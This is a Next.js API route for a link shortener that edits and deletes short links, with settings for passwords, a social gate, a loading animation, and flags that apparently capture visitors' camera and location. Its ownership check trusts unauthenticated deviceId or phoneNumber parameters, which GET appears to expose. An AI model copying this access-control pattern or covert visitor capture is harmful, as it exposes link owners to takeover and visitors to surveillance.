import { NextResponse } from "next/server";
import {
  deleteLink,
  getLinkByCode,
  hashPassword,
  updateLink,
  verifyPassword,
} from "@/lib/db";
import { bearerFromRequest, verifyToken } from "@/lib/auth";
import { asBool, asString, normalizeExpiry, sanitizeAlias } from "@/lib/validate";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

interface Ctx {
  params: Promise<{ code: string }>;
}

export async function GET(_req: Request, { params }: Ctx) {
  const { code } = await params;
  const link = await getLinkByCode(code);
  if (!link) {
    return NextResponse.json({ success: false, error: "Link not found." }, { status: 404 });
  }
  return NextResponse.json({
    success: true,
    data: {
      ...link,
      password_hash: undefined,
      has_password: !!link.password_hash,
    },
  });
}

export async function PATCH(req: Request, { params }: Ctx) {
  const { code } = await params;
  const existing = await getLinkByCode(code);
  if (!existing) {
    return NextResponse.json({ success: false, error: "Link not found." }, { status: 404 });
  }

  let body: Record<string, unknown>;
  try {
    body = (await req.json()) as Record<string, unknown>;
  } catch {
    return NextResponse.json({ success: false, error: "Invalid JSON body" }, { status: 400 });
  }

  // Ownership guard: only the creating device/user/phone (or an authed owner) may edit.
  const userId = verifyToken(bearerFromRequest(req));
  const url = new URL(req.url);
  const deviceId = url.searchParams.get("deviceId");
  const phoneNumber = url.searchParams.get("phoneNumber");
  const owned =
    (userId && existing.user_id === userId) ||
    (deviceId && existing.device_id === deviceId) ||
    (phoneNumber && existing.phone_number === phoneNumber) ||
    (!existing.device_id && !existing.user_id && !existing.phone_number);
  if (!owned) {
    return NextResponse.json({ success: false, error: "Not authorised." }, { status: 403 });
  }

  const patch: Record<string, unknown> = {};

  if ("enablePassword" in body) {
    if (asBool(body.enablePassword)) {
      const pwd = asString(body.newPassword, 120);
      if (!pwd) {
        return NextResponse.json(
          { success: false, error: "Password cannot be empty." },
          { status: 400 },
        );
      }
      patch.password_hash = hashPassword(pwd);
    } else {
      patch.password_hash = null;
    }
  }

  if ("enableSocialGate" in body) {
    if (asBool(body.enableSocialGate)) {
      const title = asString(body.socialGateTitle, 120);
      const sUrl = asString(body.socialGateUrl, 500);
      if (!title || !sUrl) {
        return NextResponse.json(
          { success: false, error: "Social gate title and URL are required." },
          { status: 400 },
        );
      }
      patch.social_gate_title = title;
      patch.social_gate_url = sUrl;
      patch.social_gate_icon = asString(body.socialGateIcon, 30) || "link";
      patch.social_gate_description = asString(body.socialGateDescription, 240) || null;
      patch.social_gate_button_text = asString(body.socialGateButtonText, 60) || "Verify & Continue";
    } else {
      patch.social_gate_title = null;
      patch.social_gate_url = null;
      patch.social_gate_description = null;
      patch.social_gate_button_text = null;
    }
  }

  if ("captureCamera" in body) patch.capture_camera = asBool(body.captureCamera);
  if ("captureLocation" in body) patch.capture_location = asBool(body.captureLocation);
  if ("animationType" in body) patch.animation_type = asString(body.animationType, 30) || "ring";
  if ("animationText" in body) patch.animation_text = asString(body.animationText, 40) || "LOADING";
  if ("expiresAt" in body) {
    const expiry = normalizeExpiry(body.expiresAt);
    if (expiry === undefined) {
      return NextResponse.json(
        { success: false, error: "That expiration date could not be understood." },
        { status: 400 },
      );
    }
    patch.expires_at = expiry;
  }
  if ("customAlias" in body) {
    const rawAlias = asString(body.customAlias, 40);
    const newAlias = sanitizeAlias(body.customAlias);
    if (rawAlias && !newAlias) {
      return NextResponse.json(
        {
          success: false,
          error:
            "Custom alias must be 3–25 characters (letters, numbers, dashes, underscores) and must not be a reserved word.",
        },
        { status: 400 },
      );
    }
    if (newAlias && newAlias !== code) {
      // Uniqueness is enforced here as well as in POST /api/shorten, otherwise a
      // rename could shadow an existing link.
      const taken = await getLinkByCode(newAlias);
      if (taken) {
        return NextResponse.json(
          { success: false, error: "That custom alias is already taken." },
          { status: 409 },
        );
      }
      patch.short_code = newAlias;
    }
  }

  const updated = await updateLink(code, patch);
  return NextResponse.json({
    success: true,
    data: updated ? { ...updated, password_hash: undefined } : null,
  });
}

export async function DELETE(req: Request, { params }: Ctx) {
  const { code } = await params;
  const existing = await getLinkByCode(code);
  if (!existing) {
    return NextResponse.json({ success: false, error: "Link not found." }, { status: 404 });
  }
  const userId = verifyToken(bearerFromRequest(req));
  const url = new URL(req.url);
  const deviceId = url.searchParams.get("deviceId");
  const phoneNumber = url.searchParams.get("phoneNumber");
  const owned =
    (userId && existing.user_id === userId) ||
    (deviceId && existing.device_id === deviceId) ||
    (phoneNumber && existing.phone_number === phoneNumber) ||
    (!existing.device_id && !existing.user_id && !existing.phone_number);
  if (!owned) {
    return NextResponse.json({ success: false, error: "Not authorised." }, { status: 403 });
  }
  await deleteLink(code);
  return NextResponse.json({ success: true });
}
